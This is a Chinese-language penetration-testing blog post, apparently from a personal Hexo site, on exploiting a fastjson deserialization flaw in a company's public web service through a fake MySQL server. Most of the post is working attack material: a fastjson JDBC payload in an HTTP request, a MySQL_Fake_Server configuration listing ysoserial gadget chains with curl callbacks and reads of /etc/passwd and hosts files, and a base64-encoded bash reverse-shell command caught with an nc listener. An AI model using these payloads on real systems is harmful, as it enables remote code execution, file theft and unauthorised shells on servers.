@@ -1,0 +1,299 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>fastjson-jdbc-fuzz | z0@ServSec</title>
+
+  <!-- keywords -->
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="最近对企业公网开放的web测试的时候，发现一处fastjson反序列化漏洞，需要结合mysql反序列化来利用，于是做了下记录。 1.判断业务存在fastjson利用hostToConnectTo参数修改成dns，并且把portToConnectTo修改成80，在dnslog中可以收到请求。 123456789101112131415http:&#x2F;&#x2F;**&#x2F;h*wk&#x2F;**数据包如下：POST &#x2F;** H">
+<meta property="og:type" content="article">
+<meta property="og:title" content="fastjson-jdbc-fuzz">
+<meta property="og:url" content="https://z0edff0x3d.github.io/2022/01/25/fastjson-jdbc-fuzz/index.html">
+<meta property="og:site_name" content="z0@ServSec">
+<meta property="og:description" content="最近对企业公网开放的web测试的时候，发现一处fastjson反序列化漏洞，需要结合mysql反序列化来利用，于是做了下记录。 1.判断业务存在fastjson利用hostToConnectTo参数修改成dns，并且把portToConnectTo修改成80，在dnslog中可以收到请求。 123456789101112131415http:&#x2F;&#x2F;**&#x2F;h*wk&#x2F;**数据包如下：POST &#x2F;** H">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://z0edff0x3d.github.io/2022/01/25/fastjson-jdbc-fuzz/image-20220401163656870.png">
+<meta property="og:image" content="https://z0edff0x3d.github.io/2022/01/25/fastjson-jdbc-fuzz/image-20220401163727108.png">
+<meta property="og:image" content="https://z0edff0x3d.github.io/2022/01/25/fastjson-jdbc-fuzz/image-20220401164502384.png">
+<meta property="og:image" content="https://z0edff0x3d.github.io/2022/01/25/fastjson-jdbc-fuzz/image-20220401164638756.png">
+<meta property="og:image" content="https://z0edff0x3d.github.io/2022/01/25/fastjson-jdbc-fuzz/image-20220401165227078.png">
+<meta property="article:published_time" content="2022-01-25T05:55:09.264Z">
+<meta property="article:modified_time" content="2022-04-07T02:32:27.434Z">
+<meta property="article:author" content="z0edff0x3d">
+<meta property="article:tag" content="渗透测试">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://z0edff0x3d.github.io/2022/01/25/fastjson-jdbc-fuzz/image-20220401163656870.png">
+  
+    <link rel="alternative" href="/atom.xml" title="z0@ServSec" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/img/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+
+  
+<script src="//cdn.bootcss.com/require.js/2.3.2/require.min.js"></script>
+
+  
+<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>
+
+
+  
+<meta name="generator" content="Hexo 6.0.0"></head>
+<body>
+  <div id="container">
+    <div id="particles-js"></div>
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+	<header id="header" class="inner">
+		<a href="/" class="profilepic">
+			
+				<img lazy-src="/img/head.jpg" class="js-avatar">
+			
+		</a>
+
+		<hgroup>
+			<h1 class="header-author"><a href="/">z0edff0x3d</a></h1>
+		</hgroup>
+
+		
+
+		<div class="switch-area">
+			<div class="switch-wrap">
+				<section class="switch-part switch-part1">
+					<nav class="header-menu">
+						<ul>
+						
+							<li><a href="/">Home</a></li>
+				        
+							<li><a href="/archives">Archives</a></li>
+				        
+						</ul>
+					</nav>
+					<nav class="half-header-menu">
+						<a class="hide">Home</a>
+						<a>Tags</a>
+						<a>Links</a>
+						<a>About</a>
+					</nav>
+					<nav class="header-nav">
+						<div class="social">
+							
+						</div>
+						<!-- music -->
+						
+					</nav>
+				</section>
+				
+				
+				<section class="switch-part switch-part2">
+					<div class="widget tagcloud" id="js-tagcloud">
+						<a href="/tags/Blog/" style="font-size: 10px;">Blog</a> <a href="/tags/GO/" style="font-size: 15px;">GO</a> <a href="/tags/Hexo/" style="font-size: 10px;">Hexo</a> <a href="/tags/Mac/" style="font-size: 10px;">Mac</a> <a href="/tags/Python/" style="font-size: 17.5px;">Python</a> <a href="/tags/SBOM/" style="font-size: 10px;">SBOM</a> <a href="/tags/SCA/" style="font-size: 10px;">SCA</a> <a href="/tags/vCenter/" style="font-size: 12.5px;">vCenter</a> <a href="/tags/%E4%BA%91%E5%8E%9F%E7%94%9F/" style="font-size: 10px;">云原生</a> <a href="/tags/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/" style="font-size: 20px;">安全开发</a> <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="font-size: 12.5px;">渗透测试</a> <a href="/tags/%E7%94%9F%E6%B4%BB/" style="font-size: 10px;">生活</a>
+					</div>
+				</section>
+				
+				
+				
+				<section class="switch-part switch-part3">
+					<div id="js-friends">
+					
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="/">以下排名不分先后</a>
+			        
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://github.com/">github</a>
+			        
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://g0uz1.github.io/">g0uz1(大哥)</a>
+			        
+			        </div>
+				</section>
+				
+
+				
+				
+				<section class="switch-part switch-part4">
+				
+					<div id="js-aboutme">I&#39;m a pentester.</div>
+				</section>
+				
+			</div>
+		</div>
+	</header>				
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+  	<div class="overlay">
+  		<div class="slider-trigger"></div>
+  		<h1 class="header-author js-mobile-header hide"></h1>
+  	</div>
+	<div class="intrude-less">
+		<header id="header" class="inner">
+			<div class="profilepic">
+				<img lazy-src="/img/head.jpg" class="js-avatar">
+			</div>
+			<hgroup>
+			  <h1 class="header-author"></h1>
+			</hgroup>
+			
+			<nav class="header-menu">
+				<ul>
+				
+					<li><a href="/">Home</a></li>
+		        
+					<li><a href="/archives">Archives</a></li>
+		        
+		        <div class="clearfix"></div>
+				</ul>
+			</nav>
+			<nav class="header-nav">
+				<div class="social">
+					
+				</div>
+			</nav>
+		</header>				
+	</div>
+</nav>
+      <div class="body-wrap"><article id="post-fastjson-jdbc-fuzz" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2022/01/25/fastjson-jdbc-fuzz/" class="article-date">
+  	<time datetime="2022-01-25T05:55:09.264Z" itemprop="datePublished">2022-01-25</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      fastjson-jdbc-fuzz
+      
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">渗透测试</a></li></ul>
+	</div>
+
+        
+
+        
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>最近对企业公网开放的web测试的时候，发现一处fastjson反序列化漏洞，需要结合mysql反序列化来利用，于是做了下记录。</p>
+<h3 id="1-判断业务存在fastjson"><a href="#1-判断业务存在fastjson" class="headerlink" title="1.判断业务存在fastjson"></a>1.判断业务存在fastjson</h3><p>利用hostToConnectTo参数修改成dns，并且把portToConnectTo修改成80，在dnslog中可以收到请求。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">http://**/h*wk/**</span><br><span class="line">数据包如下：</span><br><span class="line">POST /** HTTP/1.1</span><br><span class="line">Host: **</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:94.0) Gecko/20100101 Firefox/94.0</span><br><span class="line">Accept: application/json, text/javascript, */*; q=0.01</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded;charset=UTF-8;</span><br><span class="line">Content-Length: 362</span><br><span class="line">Origin: http://**</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://**</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;x&quot;</span>:&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.AutoCloseable&quot;</span>,<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.mysql.jdbc.JDBC4Connection&quot;</span>,<span class="string">&quot;hostToConnectTo&quot;</span>:<span class="string">&quot;hahaha&quot;</span>,<span class="string">&quot;portToConnectTo&quot;</span>:80,<span class="string">&quot;info&quot;</span>:&#123;<span class="string">&quot;user&quot;</span>:<span class="string">&quot;root&quot;</span>,<span class="string">&quot;password&quot;</span>:<span class="string">&quot;ubuntu&quot;</span>,<span class="string">&quot;useSSL&quot;</span>:<span class="string">&quot;false&quot;</span>,<span class="string">&quot;statementInterceptors&quot;</span>:<span class="string">&quot;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span>,<span class="string">&quot;autoDeserialize&quot;</span>:<span class="string">&quot;true&quot;</span>&#125;,<span class="string">&quot;databaseToConnectTo&quot;</span>:<span class="string">&quot;mysql&quot;</span>,<span class="string">&quot;url&quot;</span>:<span class="string">&quot;&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-利用fakemysql伪造一个mysql客户端"><a href="#2-利用fakemysql伪造一个mysql客户端" class="headerlink" title="2.利用fakemysql伪造一个mysql客户端"></a>2.利用fakemysql伪造一个mysql客户端</h3><p>原理是当程序触发fastjson漏洞去请求远程的mysql服务时，过低的myslq组件会触发mysql的客户端反序列化漏洞，工具是fnmsd大佬写的<a target="_blank" rel="noopener" href="https://github.com/fnmsd/MySQL_Fake_Server%E3%80%82">https://github.com/fnmsd/MySQL_Fake_Server。</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">直接开启python3 server.py就可以了</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/01/25/fastjson-jdbc-fuzz/image-20220401163656870.png" alt="image-20220401163656870"></p>
+<p><img src="/2022/01/25/fastjson-jdbc-fuzz/image-20220401163727108.png" alt="image-20220401163727108"></p>
+<h3 id="3-修改config文件来fuzz反序列化链条"><a href="#3-修改config文件来fuzz反序列化链条" class="headerlink" title="3.修改config文件来fuzz反序列化链条"></a>3.修改config文件来fuzz反序列化链条</h3><p>使用curl探测能出网的链条，这样就知道哪条链可以用来打了</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;config&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;ysoserialPath&quot;</span>:<span class="string">&quot;ysoserial-0.0.8-SNAPSHOT-all.jar&quot;</span>,</span><br><span class="line">        <span class="string">&quot;javaBinPath&quot;</span>:<span class="string">&quot;java&quot;</span>,</span><br><span class="line">        <span class="string">&quot;fileOutputDir&quot;</span>:<span class="string">&quot;./fileOutput/&quot;</span>,</span><br><span class="line">        <span class="string">&quot;displayFileContentOnScreen&quot;</span>:<span class="literal">true</span>,</span><br><span class="line">        <span class="string">&quot;saveToFile&quot;</span>:<span class="literal">true</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;fileread&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;win_ini&quot;</span>:<span class="string">&quot;c:\\windows\\win.ini&quot;</span>,</span><br><span class="line">        <span class="string">&quot;win_hosts&quot;</span>:<span class="string">&quot;c:\\windows\\system32\\drivers\\etc\\hosts&quot;</span>,</span><br><span class="line">        <span class="string">&quot;win&quot;</span>:<span class="string">&quot;c:\\windows\\&quot;</span>,</span><br><span class="line">        <span class="string">&quot;linux_passwd&quot;</span>:<span class="string">&quot;/etc/passwd&quot;</span>,</span><br><span class="line">        <span class="string">&quot;linux_hosts&quot;</span>:<span class="string">&quot;/etc/hosts&quot;</span>,</span><br><span class="line">        <span class="string">&quot;index_php&quot;</span>:<span class="string">&quot;index.php&quot;</span>,</span><br><span class="line">        <span class="string">&quot;ssrf&quot;</span>:<span class="string">&quot;https://www.baidu.com/&quot;</span>,</span><br><span class="line">        <span class="string">&quot;__defaultFiles&quot;</span>:[<span class="string">&quot;/etc/hosts&quot;</span>,<span class="string">&quot;c:\\windows\\system32\\drivers\\etc\\hosts&quot;</span>]</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;yso&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;Jdk7u21&quot;</span>:[<span class="string">&quot;Jdk7u21&quot;</span>,<span class="string">&quot;curl http://Jdk7u21.dnscheck.io&quot;</span>],</span><br><span class="line">        <span class="string">&quot;CommonsCollections1&quot;</span>:[<span class="string">&quot;CommonsCollections1&quot;</span>,<span class="string">&quot;curl http://CommonsCollections1.dnscheck.io&quot;</span>],</span><br><span class="line">        <span class="string">&quot;CommonsCollections2&quot;</span>:[<span class="string">&quot;CommonsCollections2&quot;</span>,<span class="string">&quot;curl http://CommonsCollections2.dnscheck.io&quot;</span>],</span><br><span class="line">        <span class="string">&quot;CommonsCollections3&quot;</span>:[<span class="string">&quot;CommonsCollections3&quot;</span>,<span class="string">&quot;curl http://CommonsCollections3.dnscheck.io&quot;</span>],</span><br><span class="line">        <span class="string">&quot;CommonsCollections4&quot;</span>:[<span class="string">&quot;CommonsCollections4&quot;</span>,<span class="string">&quot;curl http://CommonsCollections4.dnscheck.io&quot;</span>],</span><br><span class="line">        <span class="string">&quot;CommonsCollections5&quot;</span>:[<span class="string">&quot;CommonsCollections5&quot;</span>,<span class="string">&quot;curl http://CommonsCollections5.dnscheck.io&quot;</span>],</span><br><span class="line">        <span class="string">&quot;CommonsCollections6&quot;</span>:[<span class="string">&quot;CommonsCollections6&quot;</span>,<span class="string">&quot;curl http://CommonsCollections6.dnscheck.io&quot;</span>],</span><br><span class="line">        <span class="string">&quot;CommonsCollections7&quot;</span>:[<span class="string">&quot;CommonsCollections7&quot;</span>,<span class="string">&quot;curl http://CommonsCollections7.dnscheck.io&quot;</span>],</span><br><span class="line">        <span class="string">&quot;URLDNS&quot;</span>:[<span class="string">&quot;URLDNS&quot;</span>,<span class="string">&quot;http://URLDNS.dnscheck.io&quot;</span>],</span><br><span class="line">        <span class="string">&quot;CommonsCollectionsK1TomcatEcho&quot;</span>:[<span class="string">&quot;CommonsCollectionsK1TomcatEcho&quot;</span>,<span class="string">&quot;whoami&quot;</span>],</span><br><span class="line">        <span class="string">&quot;CommonsCollectionsK2TomcatEcho&quot;</span>:[<span class="string">&quot;CommonsCollectionsK2TomcatEcho&quot;</span>,<span class="string">&quot;whoami&quot;</span>],</span><br><span class="line">        <span class="string">&quot;BeanShell1&quot;</span>:[<span class="string">&quot;BeanShell1&quot;</span>,<span class="string">&quot;curl http://BeanShell1.dnscheck.io&quot;</span>],</span><br><span class="line">        <span class="string">&quot;C3P0&quot;</span>:[<span class="string">&quot;C3P0&quot;</span>,<span class="string">&quot;curl http://C3P0.dnscheck.io&quot;</span>],</span><br><span class="line">        <span class="string">&quot;CommonsBeanutils1&quot;</span>:[<span class="string">&quot;CommonsBeanutils1&quot;</span>,<span class="string">&quot;curl http://CommonsBeanutils1.dnscheck.io&quot;</span>],</span><br><span class="line">        <span class="string">&quot;CommonsCollectionsK1&quot;</span>:[<span class="string">&quot;CommonsCollectionsK1&quot;</span>,<span class="string">&quot;curl http://CommonsCollectionsK1.dnscheck.io&quot;</span>],</span><br><span class="line">        <span class="string">&quot;CommonsCollectionsK2&quot;</span>:[<span class="string">&quot;CommonsCollectionsK2&quot;</span>,<span class="string">&quot;curl http://CommonsCollectionsK2.dnscheck.io&quot;</span>],</span><br><span class="line">        <span class="string">&quot;CommonsCollectionsK3&quot;</span>:[<span class="string">&quot;CommonsCollectionsK3&quot;</span>,<span class="string">&quot;curl http://CommonsCollectionsK3.dnscheck.io&quot;</span>],</span><br><span class="line">        <span class="string">&quot;CommonsCollectionsK4&quot;</span>:[<span class="string">&quot;CommonsCollectionsK4&quot;</span>,<span class="string">&quot;curl http://CommonsCollectionsK4.dnscheck.io&quot;</span>],</span><br><span class="line">        <span class="string">&quot;FileUpload1&quot;</span>:[<span class="string">&quot;FileUpload1&quot;</span>,<span class="string">&quot;curl http://FileUpload1.dnscheck.io&quot;</span>],</span><br><span class="line">        <span class="string">&quot;Jdk8u20&quot;</span>:[<span class="string">&quot;Jdk8u20&quot;</span>,<span class="string">&quot;curl http://Jdk8u20.dnscheck.io&quot;</span>],</span><br><span class="line">        <span class="string">&quot;Spring1&quot;</span>:[<span class="string">&quot;Spring1&quot;</span>,<span class="string">&quot;curl http://Spring1.dnscheck.io&quot;</span>],</span><br><span class="line">        <span class="string">&quot;Spring2&quot;</span>:[<span class="string">&quot;Spring2&quot;</span>,<span class="string">&quot;curl http://Spring2.dnscheck.io&quot;</span>],</span><br><span class="line">        <span class="string">&quot;Vaadin1&quot;</span>:[<span class="string">&quot;Vaadin1&quot;</span>,<span class="string">&quot;curl http://Vaadin1.dnscheck.io&quot;</span>],</span><br><span class="line">        <span class="string">&quot;Wicket1&quot;</span>:[<span class="string">&quot;Wicket1&quot;</span>,<span class="string">&quot;curl http://Wicket1.dnscheck.io&quot;</span>]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>修改用户名为fuzz的链条名字，修改port为3306，服务器发送了请求，伪造的mysql收到请求</p>
+<img src="/2022/01/25/fastjson-jdbc-fuzz/image-20220401164502384.png" alt="image-20220401164502384" style="zoom:50%;">
+
+<h3 id="4-精准打击"><a href="#4-精准打击" class="headerlink" title="4.精准打击"></a>4.精准打击</h3><p>判断哪条链可以出来之后，就可以精准打击，修改配置文件，重新启动mysql服务，发送数据包</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;config&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;ysoserialPath&quot;</span>:<span class="string">&quot;ysoserial-0.0.8-SNAPSHOT-all.jar&quot;</span>,</span><br><span class="line">        <span class="string">&quot;javaBinPath&quot;</span>:<span class="string">&quot;java&quot;</span>,</span><br><span class="line">        <span class="string">&quot;fileOutputDir&quot;</span>:<span class="string">&quot;./fileOutput/&quot;</span>,</span><br><span class="line">        <span class="string">&quot;displayFileContentOnScreen&quot;</span>:<span class="literal">true</span>,</span><br><span class="line">        <span class="string">&quot;saveToFile&quot;</span>:<span class="literal">true</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;fileread&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;win_ini&quot;</span>:<span class="string">&quot;c:\\windows\\win.ini&quot;</span>,</span><br><span class="line">        <span class="string">&quot;win_hosts&quot;</span>:<span class="string">&quot;c:\\windows\\system32\\drivers\\etc\\hosts&quot;</span>,</span><br><span class="line">        <span class="string">&quot;win&quot;</span>:<span class="string">&quot;c:\\windows\\&quot;</span>,</span><br><span class="line">        <span class="string">&quot;linux_passwd&quot;</span>:<span class="string">&quot;/etc/passwd&quot;</span>,</span><br><span class="line">        <span class="string">&quot;linux_hosts&quot;</span>:<span class="string">&quot;/etc/hosts&quot;</span>,</span><br><span class="line">        <span class="string">&quot;index_php&quot;</span>:<span class="string">&quot;index.php&quot;</span>,</span><br><span class="line">        <span class="string">&quot;ssrf&quot;</span>:<span class="string">&quot;https://www.baidu.com/&quot;</span>,</span><br><span class="line">        <span class="string">&quot;__defaultFiles&quot;</span>:[<span class="string">&quot;/etc/hosts&quot;</span>,<span class="string">&quot;c:\\windows\\system32\\drivers\\etc\\hosts&quot;</span>]</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;yso&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;CommonsCollections3&quot;</span>:[<span class="string">&quot;CommonsCollections3&quot;</span>,<span class="string">&quot;bash -c &#123;echo,*****==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/01/25/fastjson-jdbc-fuzz/image-20220401164638756.png" alt="image-20220401164638756"></p>
+<p>nc开启监听：</p>
+<p><img src="/2022/01/25/fastjson-jdbc-fuzz/image-20220401165227078.png" alt="image-20220401165227078"></p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/04/06/test/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">&lt;</strong>
+      <div class="article-nav-title">
+        
+          go-http学习记录
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/01/25/flask-sql-injection/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">flask-sql-injection</div>
+      <strong class="article-nav-caption">&gt;</strong>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+
+
+
+
+</div>
+      <footer id="footer">
+  <div class="outer">
+    <div id="footer-info">
+      <div class="footer-left">
+        &copy; 2024 z0edff0x3d
+      </div>
+        <div class="footer-right">
+          <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/preccrep/hexo-theme-jelly" target="_blank">Jelly</a>
+        </div>
+    </div>
+  </div>
+</footer>
+    </div>
+    
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+
+
+<script>
+	var yiliaConfig = {
+		fancybox: true,
+		mathjax: false,
+		animate: true,
+		isHome: false,
+		isPost: true,
+		isArchive: false,
+		isTag: false,
+		isCategory: false,
+		open_in_new: false
+	}
+</script>
+
+<script src="/js/main.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
